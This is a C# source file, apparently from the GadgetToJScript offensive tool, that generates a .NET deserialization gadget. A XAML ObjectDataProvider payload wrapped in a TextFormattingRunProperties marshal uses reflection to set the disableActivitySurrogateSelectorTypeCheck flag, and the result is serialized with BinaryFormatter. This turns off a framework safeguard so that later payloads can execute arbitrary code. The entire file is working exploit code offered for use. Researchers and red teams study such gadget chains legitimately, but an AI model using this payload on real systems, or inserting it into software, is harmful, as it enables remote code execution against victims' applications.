using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace GadgetToJScript
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            info.SetType(t);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }
    class _DisableTypeCheckGadgetGenerator
    {

        public MemoryStream generateGadget(MemoryStream ms)
        {
            string _disableTypeCheckPayload = @"<ResourceDictionary
            xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
            xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
            xmlns:s=""clr-namespace:System;assembly=mscorlib""
            xmlns:c=""clr-namespace:System.Configuration;assembly=System.Configuration""
            xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
                <ObjectDataProvider x:Key=""type"" ObjectType=""{x:Type s:Type}"" MethodName=""GetType"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""field"" ObjectInstance=""{StaticResource type}"" MethodName=""GetField"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
                        <r:BindingFlags>40</r:BindingFlags>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""set"" ObjectInstance=""{StaticResource field}"" MethodName=""SetValue"">
                    <ObjectDataProvider.MethodParameters>
                        <s:Object/>
                        <s:Boolean>true</s:Boolean>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{x:Static c:ConfigurationManager.AppSettings}"" MethodName =""Set"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
                        <s:String>true</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>";

            Object _textFRPM = new TextFormattingRunPropertiesMarshal(_disableTypeCheckPayload);
            BinaryFormatter _formatter = new BinaryFormatter();
            _formatter.Serialize(ms, _textFRPM);
            return ms;
        }

    }
}


